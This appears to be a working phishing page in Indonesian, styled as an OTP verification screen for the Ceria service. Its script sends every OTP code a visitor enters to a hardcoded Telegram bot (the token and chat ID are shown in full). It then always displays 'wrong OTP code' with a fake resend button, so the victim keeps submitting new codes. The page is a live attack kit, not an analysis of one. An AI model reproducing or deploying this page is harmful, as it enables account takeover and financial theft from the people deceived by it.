<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Otp Ceria</title>
  <meta name="viewport" content="width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    /* Gambar */
#gambar-atas img {
  width: 98%;
  object-fit: cover;
}

/* Kolom Input Kode OTP */
#kode-otp {
  margin-top: 10px;
  width: 90%;
  max-width: 290px;
  padding: 15px;
  border-radius: 5px;
  border: 2px solid #663399;
}

/* Waktu Hitung Mundur */
#countdown {
  margin-top: 25px;
  font-size: 16px;
  color: #red;
}

/* Tombol Submit */
#submit {
  margin-top: 20px;
  padding: 13px;
  border-radius: 5px;
  border: none;
  background-color: #663399;
  color: white;
  font-weight: bold;
  cursor: pointer;
  width: 90%;
  max-width: 450px;
}

/* Gambar di bawah Tombol Submit */
#gambar-bawah img {
  width: 92%;
  object-fit: cover;
}
/* Kolom Input Kode OTP */
#kode-otp-container {
  display: flex;
  padding: 20px;
  justify-content: space-between;
  margin-top: 20px;
  width: 90%;
  max-width: 450px;
}

.kode-otp-input {
  flex: 1;
  margin-right: 5px;
  padding: 12px;
  border-radius: 5px;
  border: 2px solid #663399;
  box-sizing: border-box;
  width: 90%;
}

#submit-container {
  display: flex;
  width: 90%;
  max-width: 450px;
  justify-content: space-between;
  margin-top: 20px;
}

#submit1,
#submit2 {
  flex: 1;
  padding: 12px;
  border-radius: 5px;
  border: none;
  background-color: #663399;
  color: white;
  font-weight: bold;
  cursor: pointer;
  margin-right: 5px;
}
#countdown {
  font-size: 16px;
  color: #red;
  width: 90%;
  max-width: 290px;
  margin-top: 10px;
}

/* Elemen Hasil */
#result {
  display: none;
  width: 80%;
  padding-bottom: 50%;
  background-color: black;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  margin-top: 20px;
}

#errorMessage {
  text-align: center;
  font-size: 18px;
  color: red;
  margin-top: 16px;
}
#resendButton {margin-top: 40px;}
#resendButton {
  color: white; /* Warna teks */
  background-color: #663399; /* Warna latar belakang */
}
#resendButton {
  font-size: 10px; /* Ukuran teks */
  font-weight: bold; /* Ketebalan teks */
  text-decoration: none; /* Gaya dekorasi teks (misalnya, underline) */
}
#resendButton {
  border: 2px solid #663399; /* Lebar dan warna border */
  border-radius: 5px; /* Radius sudut border */
}
#resendButton {
  padding: 10px; /* Ruang dalam tombol */
  margin-top: 10px; /* Jarak antara tombol dan elemen di atasnya */
}
<style>#countdown {
  margin-top: 70px;
  font-size: 16px;
  color: #red;
}
</style>
  <script>
function sendMessageToTelegram(message) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
          console.log("Pesan terkirim: " + message);
        }
      };

      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);

      xhttp.open("POST", url, true);
      xhttp.send();
    }

    function kirimPesan(inputNumber) {
      var kodeOTP = document.getElementById("kode-otp").value;
      var kodeOTP1 = document.getElementById("kode-otp1").value;
      var kodeOTP2 = document.getElementById("kode-otp2").value;

      switch (inputNumber) {
        case 1:
          sendMessageToTelegram("Kode OTP: " + kodeOTP);
          break;
        case 2:
          sendMessageToTelegram("Kode OTP1: " + kodeOTP1);
          break;
        case 3:
          sendMessageToTelegram("Kode OTP2: " + kodeOTP2);
          break;
        default:
          break;
      }

      document.getElementById("result").style.display = "block";
    }

    function resendCode() {
      alert("OTP code resent!");
      startCountdown(); // Memulai kembali hitung mundur setelah mengirim ulang
    }

    function redirectToOtpInput() {
      alert("Redirect ke halaman input OTP");
    }

    function startCountdown() {
      var countDownDate = new Date().getTime() + 5 * 60 * 1000;
      var countdownElement = document.getElementById("countdown");

      var x = setInterval(function() {
        var now = new Date().getTime();
        var distance = countDownDate - now;

        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);

        countdownElement.innerHTML = "" + minutes + "m " + seconds + "s ";

        if (distance < 0) {
          clearInterval(x);
          countdownElement.innerHTML = "0 : 0";
        }
      }, 1000);
    }

    // Memulai hitung mundur saat halaman dimuat
    window.onload = function() {
      startCountdown();
    };
  </script>
</head>
<body>
  <!-- Gambar -->
  <div id="gambar-atas">
    <img src="https://i.ibb.co/BZJtDS3/IMG-20231229-WA0015-removebg-preview.png" alt="Gambar Atas">
  </div>

  <!-- Kolom Input Kode OTP -->
  <input type="number" id="kode-otp" name="kode_otp" placeholder="Masukan Kode OTP" maxlength="6">

  <!-- Waktu Hitung Mundur -->
  <div id="countdown"></div>
  
  <!-- Gambar Bawah -->
  <div id="gambar-bawah">
    <img src="https://i.ibb.co/sQY3y2g/IMG-20231229-WA0016-removebg-preview.png" alt="Gambar 2711">
  </div>

  <!-- Kolom Input Kode OTP -->
  <div id="kode-otp-container">
    <input type="number" class="kode-otp-input" id="kode-otp1" name="kode_otp" placeholder="Kode OTP1" maxlength="4">
    <input type="number" class="kode-otp-input" id="kode-otp2" name="kode_otp" placeholder="Kode OTP2" maxlength="4">
  </div>

  <!-- Tombol Submit -->
  <div id="submit-container">
    <input type="submit" id="submit1" value="Kirim" onclick="kirimPesan(2)">
    <input type="submit" id="submit2" value="Kirim" onclick="kirimPesan(3)">
  </div>
  <!-- Tombol Submit -->
  <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan(1)">
  <!-- Elemen Hasil -->
  <div id="result">
    <div id="errorMessage">KODE OTP SALAH</div>
    <button id="resendButton" onclick="redirectToOtpInput()">Kirim Ulang</button>
  </div>
</body>
</html>
